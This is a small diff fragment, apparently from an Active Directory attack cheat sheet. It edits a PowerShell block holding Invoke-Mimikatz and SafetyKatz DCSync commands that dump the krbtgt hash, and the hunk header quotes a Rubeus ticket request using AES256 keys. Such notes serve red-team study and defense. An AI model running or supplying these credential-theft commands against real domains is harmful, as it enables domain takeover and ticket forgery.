@@ -512,5 +512,7 @@ $ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createneton
 
 
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+$ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
+
+- 
